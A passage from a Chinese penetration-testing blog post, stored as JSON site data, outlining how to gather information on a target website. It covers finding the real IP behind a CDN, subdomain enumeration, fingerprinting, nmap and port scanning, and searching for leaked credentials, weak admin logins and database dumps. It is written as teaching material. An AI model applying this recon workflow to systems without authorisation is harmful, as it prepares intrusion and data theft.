，可能会得到真实的ip地址。 (6)Nslookup查询：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。传送门：各种解析记录 (7)网站漏洞：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址 (8)Censys查询SSL证书找到真实IP：利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。 域名的whois信息 whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。 -通常，我们进行whois查询是去： 站长之家whois查询 子域名信息查询layer子域名爆破机，获取如下 链接: https://pan.baidu.com/s/1IS1QCeb6vPIpabBr3LBJ6w 提取码: w749 subDomainBrute subDomainBrute的特点是可以用小字典递归的发现三级域名、四级域名、甚至五级域名等不容易被探测到的域名。 https://www.freebuf.com/sectool/106625.html //使用方式如下链接 goole查询 site:baidu.com -www HTTP证书查询 证书透明度(Certificate Transparency)是证书授权机构的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。在线网站：https://crt.sh 公司敏感信息网上收集 当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如：公司的邮箱，员工的姓名，以及与该公司有关的任何信息。还可以去github，码云等平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息，邮箱密码，还有可能有泄露的源代码等 网站指纹识别 在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。 常见的网站指纹识别工具有：whatweb等。 在线指纹识别网站： BugScaner：http://whatweb.bugscaner.com/look/云悉指纹：http://www.yunsee.cn/finger.htmlWhatWeb：https://whatweb.net/ 整站分析服务器类型（windows、linux） ping命令探测，windows的TTL值一般都是128，linux则是64，大于100的肯定是windows，而几十的肯定是linux。 但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping 而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来 namp -O 192.168.10.30 网站容器（apache、nginx、tomcat、IIS） 知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。 脚本类型（php、jsp、asp、aspx） 根据网站的URL来判断 site:xxx filetype:php 根据wappalyer插件来判断 数据库类型（mysql、oracle、accsee、sqlserver）*几种数据库的区别：* Access 小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库 SQL Server是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf MySQL 是一个关系型数据库管理系统，MySQL数据库大部分是php的页面。默认端口是3306 Oracle是一款关系数据库管理系统。常用于比较大的网站。默认端口是1521 常见搭配： ASP 和 ASPX：ACCESS、SQL Server PHP：MySQL、PostgreSQL JSP：Oracle、MySQL 主机扫描对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。 主机扫描的工具也有很多，比如：Nessus 端口扫描需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞： 22 ssh弱口令 873 rsync未授权访问漏洞 3306 mysql弱口令 6379 redis未授权访问漏洞 端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。 网站敏感目录和文件扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏 后台目录：弱口令，万能密码，爆破 安装包：获取数据库信息，甚至是网站源码 上传目录：截断、上传图片马等 mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell 安装页面 ：可以二次安装进而绕过 phpinfo：会把你配置的各种信息暴露出来 编辑器：fck、ke、等 iis短文件利用：条件比较苛刻 windows、apache等 robots.txt，防止Goole hack的威胁 探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等 旁站和C段扫描 旁站指的是同一服务器上的其他网站 C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器 旁站和C段在线查询地址： http://www.webscan.cc/https://phpinfo.me/bing.php 网站漏洞扫描网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等 参考链接： https://xie1997.blog.csdn.net/article/details/84027438","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}],"categories":[{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"python","slug":"python","permalink":"http://example.com/categories/python/"}],"tags":[{"name":"vul","slug":"vul","permalink":"http://example.com/tags/vul/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"通用漏洞","slug":"通用漏洞","permalink":"http://example.com/tags/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"内网","slug":"内网","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}